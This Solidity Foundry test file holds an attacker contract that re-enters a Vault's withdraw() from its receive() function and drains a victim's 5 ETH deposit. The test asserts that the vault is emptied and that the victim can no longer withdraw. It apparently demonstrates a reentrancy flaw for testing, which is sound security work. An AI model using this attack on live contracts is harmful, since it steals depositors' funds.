// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";

/// Attacker contract: deposits 1 ETH, then re-enters withdraw() from receive().
contract ReentrantAttacker {
    Vault public vault;
    uint256 public reentered;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && reentered < 20) {
            reentered++;
            vault.withdraw(); // stake is still recorded: nothing was zeroed yet
        }
    }
}

contract VaultReentrancyTest is Test {
    Vault vault;
    ReentrantAttacker attacker;
    address victim;

    function setUp() public {
        vault = new Vault();
        attacker = new ReentrantAttacker(vault);
        victim = makeAddr("victim");

        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
    }

    function testReentrancyDrainsVault() public {
        vm.deal(address(this), 1 ether);

        uint256 vaultBefore = address(vault).balance; // 5 ether of honest funds
        uint256 attackerStart = address(attacker).balance;

        attacker.attack{value: 1 ether}();

        uint256 attackerGain = address(attacker).balance - attackerStart;
        uint256 vaultAfter = address(vault).balance;

        emit log_named_uint("vault before", vaultBefore);
        emit log_named_uint("attacker deposited", 1 ether);
        emit log_named_uint("attacker balance after", address(attacker).balance);
        emit log_named_uint("vault after (should be 0)", vaultAfter);
        emit log_named_uint("attacker net profit", attackerGain - 1 ether);
        emit log_named_uint("re-entries", attacker.reentered());

        // Attacker walked away with the victim's 5 ETH.
        assertGt(attackerGain, 1 ether);
        assertEq(vaultAfter, 0);
        assertEq(victim.balance, 0);

        // Honest victim cannot withdraw: the vault is empty.
        vm.prank(victim);
        vm.expectRevert("nothing to withdraw");
        vault.withdraw();
    }
}

